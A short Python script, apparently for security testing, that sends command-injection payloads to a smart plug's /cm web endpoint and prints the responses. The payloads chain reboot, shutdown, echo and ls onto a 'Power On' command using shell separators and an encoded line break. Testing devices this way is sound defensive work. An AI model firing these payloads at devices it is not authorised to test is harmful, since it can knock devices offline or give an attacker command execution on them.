import requests

# Replace this with the real or mock IP of the plug
target_ip = "192.168.1.113"
base_url = f"http://{target_ip}/cm"

# Payloads for injection testing
test_payloads = [
    "Power On",
    "Power On;reboot",
    "Power On && shutdown",
    "Power On || echo hacked",
    "Power On | ls",
    "Power On;%0a%0dReboot",
]

# Send each payload and print results
for payload in test_payloads:
    try:
        params = {'cmnd': payload}
        response = requests.get(base_url, params=params, timeout=3)
        print(f"Payload: {payload}")
        print(f"URL: {response.url}")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}\n")
    except Exception as e:
        print(f"Payload: {payload} --> FAILED with {e}")
